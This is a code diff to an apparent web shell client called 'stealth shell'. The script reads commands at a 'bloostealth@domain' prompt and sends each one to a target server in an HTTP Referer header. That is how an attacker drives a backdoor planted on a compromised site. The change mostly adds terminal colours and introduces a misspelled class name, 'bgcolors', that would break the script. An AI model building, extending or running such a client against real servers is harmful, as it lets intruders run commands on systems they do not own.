@@ -2,7 +2,19 @@ import requests
 from urllib.parse import unquote
 from urllib.parse import urlparse
 
-print('''                                 
+class bcolors:
+    HEADER = '\033[95m'
+    OKBLUE = '\033[94m'
+    OKCYAN = '\033[96m'
+    OKGREEN = '\033[92m'
+    WARNING = '\033[93m'
+    FAIL = '\033[91m'
+    ENDC = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+
+
+print(bcolors.WARNING + '''                                 
                     ,--,,-.----.    
   ,----..         ,--.'|\    /  \   
  /   /   \     ,--,  | :|   :    \  
@@ -19,14 +31,14 @@ print('''
   `---`     '---'         `---`     
   
   stealth shell
-''')
+''' + bcolors.ENDC)
 
 def main():
     print("")
-    cmd = input("bloostealth@"+domain+" ~#: ")
+    cmd = input(bcolors.WARNING + "bloostealth@" + domain + bcolors.ENDC + " :" + bgcolors.OKBLUE + "~" + bcolors.ENDC + "$ ")
     if cmd == "su":
         print("")
-        print("Bloos3rpent > You Need to BackConnect First!")
+        print(bcolors.WARNING + "Bloos3rpent > You Need to BackConnect First!" + bcolors.ENDC)
         main()
     else :
         r=requests.get(target, headers={"Referer":cmd})
